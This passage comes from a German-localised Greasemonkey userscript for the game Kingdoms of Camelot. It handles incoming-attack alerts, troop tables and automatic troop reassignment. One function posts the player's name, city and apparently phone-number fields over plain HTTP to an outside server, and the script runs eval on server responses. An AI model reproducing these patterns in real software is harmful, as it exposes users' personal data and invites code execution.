 data.stat = 'VERSTECKT';
 }
 if (t.defMode[m.toCityId] == 1 && Options.alertConfig.defend==true)
 {
 data.stat = 'VERTEIDIGEN';
 }
 }
 }
 data.provider = Options.celltext.provider;
 data.num1 = Options.celltext.num1;
 data.num2 = Options.celltext.num2;
 data.num3 = Options.celltext.num3;
 data.serverId = getServerId();
 data.player = Seed.player['name'];
 data.city = city.name;

 GM_xmlhttpRequest({ method: 'POST', url: 'http://hs151.digitalweb.net/index.php', headers: {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', }, data: implodeUrlArgs(data), })
},

postToChat : function (m){
  var t = Tabs.tower;
  if (DEBUG_TRACE) logit ("checkTower(): INCOMING at "+ unixTime()  +": \n"+ inspect (m, 8, 1));
  if (m.marchType == null)      // bogus march (returning scouts)
    return;
  if (ENABLE_TEST_TAB) Tabs.F.addDiv ("ACHTUNG!<BR><PRE style='margin:0px;'>" + inspect (m, 8, 1) +'</pre>');
  if (m.marchType == 3){
    if (!Options.alertConfig.scouting)
    return;
    atkType = ''+culang.pTcScouted+'';
  } else if (m.marchType == 4){
    atkType = ''+culang.pTcack+'';
  } else {
    return;
  }
  var target, HideDefendFlag, atkType, who, attackerMight, allianceId;
    var city = Cities.byID[m.toCityId];
    HideDefendFlag = '';
    if ( city.tileId == m.toTileId ) {
      target = ''+culang.holyplace+' ';
      if (Options.includeCityName)
        target += ' ' + city.name +',';
      target += ' '+culang.at+' '+ city.x +','+ city.y;
      if (defMode[m.toCityId] == 0)
        HideDefendFlag = ' = '+Options.hideMessage+'!';
      if (defMode[m.toCityId] == 1)
        HideDefendFlag = ' = '+Options.defendMessage+'!';
    }
    else {
    if (!Options.alertConfig.wilds)
    return;
    target = ''+culang.pTcwild+'';
    for (k in Seed.wilderness['city'+m.toCityId]){
    if (Seed.wilderness['city'+m.toCityId][k].tileId == m.toTileId){
      target += ' '+culang.at+' '+ Seed.wilderness['city'+m.toCityId][k].xCoord +','+ Seed.wilderness['city'+m.toCityId][k].yCoord;
      break;
    }
    }
  }
  if (Seed.players['u'+m.pid])
    who = Seed.players['u'+m.pid].n;
  else if (m.players && m.players['u'+m.pid])
    who = m.players['u'+m.pid].n;
  else
    who = 'Unknown';
    if (Seed.players['u' + m.pid]) {
      who = Seed.players['u' + m.pid].n;
      attackerMight = parseInt(Seed.players['u' + m.pid].m);
      allianceId = parseInt(Seed.players['u' + m.pid].a);
    } else if (m.players && m.players['u' + m.pid]) {
        who = m.players['u' + m.pid].n;
        attackerMight = parseInt(m.players['u' + m.pid].m);
        allianceId = parseInt(m.players['u' + m.pid].a);
    } else
        who = 'Unknown';
  var might = '';
    var alliance = '';
    if (who != 'Unknown') {
      if(Options.includeMight)
        might = ' '+culang.might+': ' + addCommas(attackerMight);
      if (Options.includeAlliance)
        alliance = ' ('+getDiplomacy(allianceId)+')'; // Seed.allianceNames[allianceId] no longer returns alliance name
    }
  if (m.fromXCoord)
      who += ' '+culang.at+' '+ m.fromXCoord +','+ m.fromYCoord;
	  who += ' ('+getDiplomacy(m.aid)+')';
    var msg = Options.alertConfig.aPrefix + ' ';
  //  msg += 'Ziel '+ target +' wird '+ atkType  +' von '+ who + alliance + might + ' ' + HideDefendFlag + ' (Ankunft in '+
    //    unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())) +') = ';
    if(m.marchStatus == 9)
	msg += ' '+ atkType +' '+culang.wascall+' '+ target +' '+culang.from+' '+ who +'';
	else
	msg += ''+culang.target+' '+ target +' '+culang.where+' '+ atkType  +' '+culang.from+' '+ who + alliance + might + ' ' + HideDefendFlag + ' ('+culang.pTcarive+' '+ unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())) +') : ';
	var totTroops = 0;
    for (k in m.unts){
      var uid = parseInt(k.substr (1));
      msg += m.unts[k] +' '+ unsafeWindow.unitcost['unt'+uid][0] +', ';
      totTroops += m.unts[k];
    }
    if (totTroops < Options.alertConfig.minTroops)
      return;
    msg = msg.slice (0, -2);
    msg += '.';
    if ( city.tileId == m.toTileId ){
      var emb = getCityBuilding(m.toCityId, 8);
      if (emb.count == 0)
	  msg += ' '+culang.nobuildEmbassy+'';
	  else {
        var availSlots = emb.maxLevel;
        for (k in Seed.queue_atkinc){
          if (Seed.queue_atkinc[k].marchType==2 && Seed.queue_atkinc[k].toCityId==m.toCityId && Cities.byID[Seed.queue_atkinc[k].fromCityId]==null){
            --availSlots;
          }
        }
    msg += ' = '+culang.pTcemb+' '+ availSlots +' '+culang.pTcemb2+' '+ emb.maxLevel +' '+culang.pTcemb3+' ';
     if (t.defMode[m.toCityId] == 0 && Options.alertConfig.defend==true)
    {
      msg+= ' = '+Options.hideMessage+'! ';
    }
    if (t.defMode[m.toCityId] == 1 && Options.alertConfig.defend==true)
    {
      msg+= ' = '+Options.defendMessage+'! ';
    }
    }
  }
  t.sendalert(m);
    if (!Options.alertConfig.aChat) return;
  if (ENABLE_TEST_TAB) Tabs.F.addDiv (msg);
  if (SEND_ALERT_AS_WHISPER)
    sendChat ("/"+ Seed.player.name +' '+ msg);    // Whisper to myself
  else
    sendChat ("/a "+  msg);                        // Alliance chat
  },
    handleTowerData: function(m){
    var t = Tabs.tower;
    var now = unixTime();
    var target, atkType, who, attackermight, allianceId, allianceName, diplomacy;
    var city = Cities.byID[m.toCityId];
    
    if (DEBUG_TRACE)
      logit("checkTower(): INCOMING at " + unixTime() + ": \n" + inspect(m, 8, 1));
    
    //ATKTYPE
    if (m.marchType == 3) {
      atkType = ''+culang.pTcScouted+'';
      t['scoutCount_' + m.toCityId]++;
    }
    else
      if (m.marchType == 4) {
        atkType = ''+culang.pTcack+'';
        t['attackCount_' + m.toCityId]++;
      }
      else { return; }
    //TARGET
    if (city.tileId == m.toTileId)
      target = ''+culang.pTcityat+' ' + city.x + ',' + city.y;
    else {
      target = ''+culang.wild+'';
      for (k in Seed.wilderness['city' + m.toCityId]) {
        if (Seed.wilderness['city' + m.toCityId][k].tileId == m.toTileId) {
          target += ' '+culang.at+' ' + Seed.wilderness['city' + m.toCityId][k].xCoord + ',' + Seed.wilderness['city' + m.toCityId][k].yCoord;
          break;
        }
      }
    }
    //CITYNAME
    var cityName = Cities.byID[m.toCityId].name;
    
    //TROOPS
    var units = [];
    for (i = 0; i < 13; i++)
      units[i] = 0;
    for (k in m.unts) {
      var uid = parseInt(k.substr(1));
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrsupply)
        units[1] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrmilitiaman)
        units[2] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.scout)
        units[3] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrpikeman)
        units[4] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrswordsman)
        units[5] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrtarcher)
        units[6] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrcavalry)
        units[7] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrheavycavalry)
        units[8] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrsupplywagon)
        units[9] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.ballista)
        units[10] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.shrbatteringram)
        units[11] = m.unts[k];
      if (unsafeWindow.unitcost['unt' + uid][0] == culang.catapult)
        units[12] = m.unts[k];
    }
    //ATTACKERS INFORMATION
    if (Seed.players['u' + m.pid]) {
      who = Seed.players['u' + m.pid].n;
      attackermight = Seed.players['u' + m.pid].m;
      allianceId = Seed.players['u' + m.pid].a;
      allianceName = Seed.allianceNames[allianceId];
      diplomacy = getDiplomacy(allianceId);
    }
    else
      if (m.players && m.players['u' + m.pid]) {
        who = m.players['u' + m.pid].n;
        attackermight = parseInt(m.players['u' + m.pid].m);
        allianceId = 'a' + m.players['u' + m.pid].a;
        allianceName = Seed.allianceNames[allianceId];
        diplomacy = getDiplomacy(allianceId);
      }
      else {
        who = 'n.A.';
        attackermight = 'n.A.';
        allianceId = 'n.A.';
        allianceName = 'n.A.';
        diplomacy = 'n.A.';
      }
  //SOURCE
    if (m.fromXCoord)
      var source = m.fromXCoord + ',' + m.fromYCoord;
    else
      var source = 'n.A.';
    
    var arrivingDatetime = new Date();
    arrivingDatetime.setTime(m.arrivalTime * 1000);
    var count = t.towerMarches.length + 1;
    t.towerMarches[count] = {
      added: now,
      cityId: m.toCityId,
      target: target,
      arrival: parseIntNan(m.arrivalTime),
      atkType: atkType,
      who: who,
      attackermight: attackermight,
      allianceName: allianceName,
      diplomacy: diplomacy,
      rtime: unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())),
      arrivingDatetime: arrivingDatetime,
    source:source,
      units: units,
    };
  },
  showTowerIncoming: function(cityId){
    var t = Tabs.tower;
    var popTowerIncoming = null;
    var cityName = Tabs.build.getCityNameById(cityId);
    
    if (t.popTowerIncoming == null) { t.popTowerIncoming = new CPopup('pbtower_' + cityId, 0, 0, 746, 100, true, function() {clearTimeout (t.timer);});    }
    t.popTowerIncoming.show(false);
    var m = '<DIV style="max-height:460px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pdxTabPad" id="pbCityTowerContent">';
    t.popTowerIncoming.getMainDiv().innerHTML = '</table></div>' + m;
    t.popTowerIncoming.getTopDiv().innerHTML = '<span class=showBadged>'+culang.pTcTrpt+' ' + cityName + '</span>';
    t.addCityData2Pop(cityId);
    t.popTowerIncoming.show(true);
  clearTimeout (t.timer);
  t.timer = setTimeout (function() {t.showTowerIncoming(cityId)}, 5000);        
  },
  addCityData2Pop: function(cityId){
    var t = Tabs.tower;
    var rownum = 0;
    var names = [''+culang.shrsupply+'', ''+culang.shrmilitiaman+'', ''+culang.scout+'', ''+culang.shrpikeman+'', ''+culang.shrswordsman+'', ''+culang.shrtarcher+'', ''+culang.shrcavalry+'', ''+culang.shrheavycavalry+'', ''+culang.shrsupplywagon+'', ''+culang.shrballista+'', ''+culang.shrbatteringram+'', ''+culang.shrcatapult+''];
    enc = {};
    numSlots = 0;
    var row = document.getElementById('pbCityTowerContent').innerHTML = "";
    if (matTypeof(Seed.queue_atkinc) != 'array') {
      for (k in Seed.queue_atkinc) {
        march = Seed.queue_atkinc[k];
        if (march.marchType == 2) {
          ++numSlots;
          city = march.toCityId;
          from = march.fromPlayerId;
      if (!enc[city])
            enc[city] = {};
          if (!enc[city][from])
            enc[city][from] = [];
          k = [];
          k[0] = parseInt(march.knightCombat);
          for (i = 1; i < 13; i++) {
            if (Options.encRemaining)
              k[i] = parseInt(march['unit' + i + 'Return']);
            else
              k[i] = parseInt(march['unit' + i + 'Count']);
          }
      k[14] = parseInt(march.marchStatus);
      var now = unixTime();
      k[15] = parseInt(march.destinationUnixTime) - now;
          enc[city][from].push(k);
        }
      }
    }
	var s1 = '';
	var s2 = '';
	var s3 = '';
	var tot = [];
	var atk = [];
	for (i = 0; i < 13; i++) {
	tot[i] = 0;
	atk[i] = 0;
    }

      s1 += '<STYLE> .tot{background:#f0e0f8;} .city{background:#ffffaa;} .attack{background:#FF9999;} .own{background:#66FF66;}</style>';
      s1 += '<TABLE cellspacing=0 width=100%><TR align=right><TD align=center width=16%></td>';
      
      for (k = 0; k < names.length; k++)
        s1 += '<TD width=7%><B>' + names[k] + '</b></td>';
      s1 += '</tr>';
      dest = cityId;
      if (enc[dest]) {
        for (p in enc[dest]) {
          try {
            player = Seed.players['u' + p].n;
          }
          catch (err) {
            player = '???';
          }
          for (m = 0; m < enc[dest][p].length; m++) {
            /*knight = '';
            if (enc[dest][p][m][0] > 0)
              knight = ' (' + enc[dest][p][m][0] + ')';
      */
      status = '';
            if (enc[dest][p][m][14] == 1) {
        status = ' (' + timestr(enc[dest][p][m][15]) + ')';  
        if (enc[dest][p][m][15] < 0)
        status = ' (enc)';  
        else
         status = ' (' + timestr(enc[dest][p][m][15]) + ')';  
      }
      if (enc[dest][p][m][14] == 2) {
        status = ' (enc)';  
      }
  s1 += '<TR align=right><TD align=left class="city">' + player + status +'</td>'
          for (i = 1; i < 13; i++) {
            num = enc[dest][p][m][i];
            s1 += '<TD class="city">' + thouormil(num) + '</td>';
            tot[i] += num;

            }
            //s1 += '<TD><INPUT id=sendhome_' + numSlots + ' type=submit value="Home" style="border:1px solid black; background-color:red;"></td></tr>';
          }
        }
      } else {
        s1 += '<TR align=right><TD align=left class="city"><B>'+culang.rptreinforce+':</b></td>'
        for (i = 1; i < 13; i++) {
          s1 += '<TD class="city">0</td>';
        }
        
      }
    s1 += '<TR align=right><TD colspan=14><BR></tr>';
      s1 += '<TR align=right><TD class="own" align=left><B>'+culang.owntrp+':</b></td>';
      //OWNTROOPS
      var ownTroops = "";
      for (r = 1; r < 13; r++) {
        cityString = 'city' + cityId;
        num = parseInt(Seed.units[cityString]['unt' + r]);
        //s1 += '<TD class="own">' + num + '</td>';
  s1 += '<TD class="own">' + thouormil(num) + '</td>';
        tot[r] += num;
      }
      s1 += '<TD class="city"></td><TR><TD colspan=14><BR></td></tr><TR align=right><TD class="tot" align=left><B>'+culang.defender+':</b></td>';
      for (i = 1; i < 13; i++)
s1 += '<TD class="tot">' + thouormil(tot[i]) + '</td>';
        //s1 += '<TD class="tot">' + tot[i] + '</td>';      
    s3 += '</tr></table>';
    
    s3 += '<TD class="city"></td><TR><TD colspan=14><BR></td></tr><TR align=right><TD class="tot" align=left><B>'+culang.inctrp+':</b></td>';
    
    var names = [''+culang.shrsupply+'', ''+culang.shrmilitiaman+'', ''+culang.scout+'', ''+culang.shrpikeman+'', ''+culang.shrswordsman+'', ''+culang.shrtarcher+'', ''+culang.shrcavalry+'', ''+culang.shrheavycavalry+'', ''+culang.shrsupplywagon+'', ''+culang.shrballista+'', ''+culang.shrbatteringram+'', ''+culang.shrcatapult+''];
    if (t.towerMarches.length > 0) {
      for (k in t.towerMarches) {
        if (typeof t.towerMarches[k].atkType != 'undefined') {
          if (t.towerMarches[k].cityId == cityId) {
            s3 += '<TABLE cellspacing=0 width=100%><TR>';
            
            if (t.towerMarches[k].atkType == ''+culang.pTcack+'') {
              s3 += '<TD rowspan=2 width=5%><B><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_4_50_s34.jpg"></b></td>';
            }
            else
              if (t.towerMarches[k].atkType == ''+culang.pTcScouted+'') {
                s3 += '<TD rowspan=2 width=5%><B><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_3_50_s34.jpg"></b></td>';
              }
				s3 += '<TD width=15%  ><B>'+culang.coord+'</b></td>';
				s3 += '<TD width=15%  ><B>'+culang.name+'</b></td>';
				s3 += '<TD width=10%><B>'+culang.source+': </b></td><TD width=10%>' + t.towerMarches[k].source + '</td>';
				s3 += '<TD width=10%><B>'+culang.might+': </b></td><TD width=10%>' + t.towerMarches[k].attackermight + '</td>';
				s3 += '<TD width=10%><B>'+culang.alliance+': </b></td><TD width=10%>' + t.towerMarches[k].allianceName + '</td>';
				s3 += '<TD width=10%><B>'+culang.diplo+': </b></td><TD width=10%>' + t.towerMarches[k].diplomacy + '</td></tr>';
				s3 += '<TR><TD width=10%  >' + t.towerMarches[k].target + '</td>';
				s3 += '<TD  >' + t.towerMarches[k].who + '</td>';
				s3 += '<TD><B>'+culang.leftfor+': </b></td><TD width=10%>' + t.towerMarches[k].rtime + '</td>';
				s3 += '<TD><B>'+culang.arrival+': </b></td><TD  colspan=5 width=10%>' + t.towerMarches[k].arrivingDatetime + '</td></tr>';
				s3 += '</tr></table>';
				s3 += '<TABLE cellspacing=0 width=100%><TR align=right><TD align=left width=16%></td>';
				for (n = 0; n < names.length; n++)
				s3 += '<TD width=7%><B>' + names[n] + '</b></td>';
				s3 += '</tr><TR align=right><TD class="attack" align=left><B>'+culang.units+':</td>';
				for (u = 1; u < 13; u++) {
				num = t.towerMarches[k].units[u];
				s3 += '<TD class="attack">' + thouormil(num) + '</td>';
				//s3 += '<TD class="attack">' + num + '</td>';
              atk[u] += parseInt(num);
            }
      s3 += '</tr></table>';
          }
        }
        
      }
    }
  s2 += '<TR><TD colspan=14><BR></td></tr><TR align=right><TD class="attack" align=left><B>'+culang.victim+':</b></td>';
    for (a = 1; a < 13; a++)
s2 += '<TD class="attack" width=7%>' + thouormil(atk[a]) + '</td>';
      //s2 += '<TD class="attack" width=7%>' + atk[a] + '</td>';
  var html = s1 + s2 + s3;
    document.getElementById('pbCityTowerContent').innerHTML = html;

  },
  sendReinforcmentHome: function(){ //FUNCTION NOT IN USE YET BUT SOON :-)
    //mid, cid, fromUid, fromCid, upkeep
    var params = Object.clone(g_ajaxparams);
    params.mid = mid;
    params.cid = cid;
    params.fromUid = fromUid;
    params.fromCid = fromCid;
    new Ajax.Request(g_ajaxpath + "ajax/kickoutReinforcements.php" + g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function(transport){
        var rslt = eval("(" + transport.responseText + ")");
        if (rslt.ok) {
          Modal.showAlert(g_js_strings.kickout_allies.troopshome);
          seed.resources["city" + currentcityid].rec1[3] = parseInt(seed.resources["city" + currentcityid].rec1[3]) - upkeep;
          if (parseInt(fromUid) == parseInt(tvuid)) {
            var curmarch = seed.queue_atkp["city" + fromCid]["m" + mid];
            var marchtime = Math.abs(parseInt(curmarch.destinationUnixTime) - parseInt(curmarch.eventUnixTime));
            curmarch.returnUnixTime = unixTime() + marchtime;
            curmarch.marchStatus = 8
          }
          delete seed.queue_atkinc["m" + mid]
        }
        else {
          Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
        }
      },
      onFailure: function(){
      }
    })
  },
}
/************************************************************************************
*						KOC POWER - TABS TRANSPORT									*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_TRANSPORT' ));
/************************************************************************************
*						KOC POWER - TABS REASSIGN									*
************************************************************************************/
var troops = { 1:'u1', 2:'u2', 3:'u3', 4:'u4', 5:'u5', 6:'u6', 7:'u7', 8:'u8', 9:'u9', 10:'u10', 11:'u11', 12:'u12', };  
Tabs.Reassign = {  tabLabel: culang.autoreassign,  tabOrder: StyleOptions.toTruppen,  myDiv: null,  timer: null,  reassignState: [],  lRE: [],  reassignRoutes: [],  rallypointlevel:null,  count:0,  check:false,

  init: function(div){
  var t = Tabs.Reassign;
	t.myDiv = div;
	t.reassignState = { running: false, };
	t.readReassignState();
	t.readReassignRoutes();
	t.e_reassignRoutes();
	var rownum = 0;
  
function _row (name, row, noTotal){
          if (rownum++ % 2)
            style = '';
          else
            style = ' style = "background: #e8e8e8"';
          var tot = 0;
          var m = [];
          m.push ('<TR style="background: #fff" align=right');
          m.push (style);
          m.push ('><TD');
          m.push (style);
          m.push ('><B>');
          m.push (name);
          m.push ('</td>');
          if (noTotal){
            m.push ('<TD');
            m.push (style);
            m.push ('>&nbsp;</td>');
          } else {
            for (i=0; i<row.length; i++)
              tot += row[i];
            m.push ('<TD style="background: #ffc">');
            m.push (addCommas(tot));
            m.push ('</td>');
          }
          for (i=0; i<row.length; i++){
            m.push ('<TD');
            m.push (style);
            m.push ('>');
            m.push (addCommas(row[i]));
            m.push ('</td>');
          }
          m.push ('</tr>');
          return m.join('');
    }
	
    var m = '<DIV id=pbReMainDivF class=pdxStat>'+culang.Hreassign+' - '+culang.Hsettings+'</div><TABLE id=pbtraderfunctions width=100% height=0% class=pdxTab><TR align="center">';
    if (t.reassignState.running == false) {  m += '<TD><INPUT id=pbReassignState type=submit value="'+culang.autoreassign+' = '+culang.buttonoff+'"></td>';    } else {      m += '<TD><INPUT id=pbReassignState type=submit value="'+culang.autoreassign+' = '+culang.buttonon+'"></td>';    }
    m += '<TD><INPUT id=pbReassShowRoutes type=submit value="'+culang.tsroutes+'"></td>';
	m += '</tr></table><BR>'+culang.reassigntrpchk+' <INPUT id=pbreassigninterval type=text size=2 value="'+Options.reassigninterval+'"\> '+culang.reassigntrpchk2+'';
    m += '</div>';

    m += '<DIV id=pbReassignDivD class=pdxStat>'+culang.HreasRoute+'</div>';
    m += '<TABLE id=pbaddreasignroute width=95% height=0% class=pdxTab><TR align="left">';
    m += '<TD width=20px><b>'+culang.heiligtum+'</b>:</td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptassigncity></span></div></td></tr>';
    m += '<TR align="left">';
    m += '<TD width=20px><b>'+culang.bunker+'</b>:</td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptassigncityTo></span></div></td>';
    m += '<TR align="left">';
    m += '</tr></table>';
	m += '<TR><TD><INPUT id=autofilloff type=checkbox unchecked=true\> '+culang.reassigntrplock+'</TR></TD></table>';     
	m += '<BR><TD colspan=4><span style=\"font-size:10px; color:#555; line-height:18px; \"><b><u><font color=#600000>'+culang.impo+'</font></b></u>: '+culang.reassignimpnote+'</span></td></tr></table>';
    m += '<TABLE id=pbaddreasignroute width=100% height=0% class=pdxTab><TR align="center">';
    
    m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_1_50_s34.jpg"></td>';
    m += '<TD>'+culang.supplytroop+'</td>';
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_2_50_s34.jpg"></td>';
    m += '<TD>'+culang.militiaman+'</td>';
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_3_50_s34.jpg"></td>';
    m += '<TD>'+culang.scout+'</td>';
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_4_50_s34.jpg"></td>';
    m += '<TD>'+culang.pikeman+'</td></tr>';
    m += '<TR><TD><INPUT id=pb'+troops[1]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[1]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[2]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[2]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[3]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[3]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[4]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[4]+' disabled=true type=text size=10 maxlength=10 value="0"\></td></tr>';
    
    m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_5_50_s34.jpg"></td>';
    m += '<TD>'+culang.swordsman+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_6_50_s34.jpg"></td>'
    m += '<TD>'+culang.archer+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_7_50_s34.jpg"></td>'
    m += '<TD>'+culang.cavalry+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_8_50_s34.jpg"></td>'
    m += '<TD>'+culang.heavycavalry+'</td></tr>'
    m += '<TR><TD><INPUT id=pb'+troops[5]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[5]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[6]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[6]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[7]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[7]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[8]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[8]+' disabled=true type=text size=10 maxlength=10 value="0"\></td></tr>';
    
    m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_9_50_s34.jpg"></td>';
    m += '<TD>'+culang.supplywagon+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_10_50_s34.jpg"></td>'
    m += '<TD>'+culang.ballista+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_11_50_s34.jpg"></td>'
    m += '<TD>'+culang.batteringram+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_12_50_s34.jpg"></td>'
    m += '<TD>'+culang.catapult+'</td></tr>'
    m += '<TR><TD><INPUT id=pb'+troops[9]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[9]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[10]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[10]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[11]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[11]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[12]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[12]+' disabled=true type=text size=10 maxlength=10 value="0"\></td></tr></table>';
    m += '<DIV style="text-align:center; margin-top:15px"><INPUT id=pbSaveRouteReassign type=submit value="Route '+culang.add+'">';	
	m +='</div>';
    
    t.myDiv.innerHTML = m;
    // t.reassignTrpStats = document.getElementById ('reassignTrpStats');<DIV class=pdxStat>'+culang.Htroops+'</div><div id=reassignTrpStats></div>
	
    t.tcp = new CdispCityPicker ('ptreassign', document.getElementById('ptassigncity'), true, t.clickCitySelect, 0);
  for(var k in troops){ document.getElementById('pbtarget'+troops[k]).value = parseInt(Seed.units['city' + t.tcp.city.id]['unt'+k]);  }
    t.tcpto = new CdispCityPicker ('ptreassignTo', document.getElementById('ptassigncityTo'), true, t.clickCitySelect).bindToXYboxes(document.getElementById ('ptcityX'), document.getElementById ('ptcityY'));

    // rows = []; rows[0]=[];
    // m = "<TABLE class=pdxTabLined cellspacing=0><TR valign=top align=right><TD width=65></td><TD width=88 style='background: #ffc'><B>"+culang.Htotal+"</b></td>";
    // for(i=0; i<Cities.numCities; i++) { m += '<TD width=81><B>'+ Cities.cities[i].name.substring(0,10) +'</b></td>'; }
    // for (r=1; r<13; r++){ rows[r] = []; for(i=0; i<Cities.numCities; i++) { cityID = 'city'+ Cities.cities[i].id; rows[r][i] = parseInt(Seed.units[cityID]['unt'+r]); }    }
    // for (r=1; r<13; r++){ m += _row ('<img height=20 title="'+unsafeWindow.unitcost['unt'+r][0]+'" src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_'+r+'_50_s34.jpg>', rows[r]);    }
    // m += "</table>";
    // t.reassignTrpStats.innerHTML = m;   
	
    document.getElementById('ptassigncity').addEventListener('click', function(){
	  if(document.getElementById('autofilloff').checked == false)
	  for(var k in troops)
		document.getElementById('pbtarget'+troops[k]).value = parseInt(Seed.units['city' + t.tcp.city.id]['unt'+k]);
		}, false);
    
    document.getElementById('pbReassignState').addEventListener('click', function(){    t.toggleReassignState(this);    }, false);
    document.getElementById('pbSaveRouteReassign').addEventListener('click', function(){    t.addReassignRoute();    }, false);
    document.getElementById('pbReassShowRoutes').addEventListener('click', function(){    t.showReassignRoutes();    }, false);
    
    document.getElementById('pbreassigninterval').addEventListener('keyup', function(){
  if (isNaN(this.value)){ this.value=0;};
  Options.reassigninterval = this.value;
  saveOptions();
    }, false);
  	for(var i in troops) {t.addlistens(i);	};
    window.addEventListener('unload', t.onUnload, false);
  },

    getRallypoint: function(cityId){      var t = Tabs.Reassign;      for (var o in Seed.buildings[cityId]){		var buildingType = parseInt(Seed.buildings[cityId][o][0]);		var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);		if (buildingType == 12) t.rallypointlevel=parseInt(buildingLevel);	   }  },
  addlistens: function(i){document.getElementById('pbtarget'+troops[i]).addEventListener('keyup', function(){if (isNaN(this.value)) this.value=0 ;}, false);		document.getElementById('pb'+troops[i]).addEventListener('click', function(){if (this.checked==false) {document.getElementById( 'pbtarget'+troops[i]).disabled = true;} else {document.getElementById( 'pbtarget'+troops[i]).disabled = false;}},false); },
  e_reassignRoutes: function(){ var t = Tabs.Reassign;    var now = new Date();    if (t.reassignState.running == true) { var now = new Date().getTime()/1000.0;    now = now.toFixed(0);    var last = Options.lastreassign;    if ( now > (parseInt(last) + (Options.reassigninterval*60))){ t.checkdoReassign(); }    } setTimeout(function(){ t.e_reassignRoutes();}, Options.reassigninterval*1000);  },
  delReassignRoutes: function() { var t = Tabs.Reassign;  t.reassignRoutes= [];  },
  addReassignRoute: function () { var t = Tabs.Reassign;  var city = t.tcp.city.id;
  if (document.getElementById('ptcityX').value==0 && document.getElementById('ptcityY').value ==0)  {    new CdialogCancelContinue ('<SPAN class=boldRed>'+culang.reassign00+'</span>', null, unsafeWindow.modal_attack_check, document.getElementById('pbReMainDivF'));    return;  }
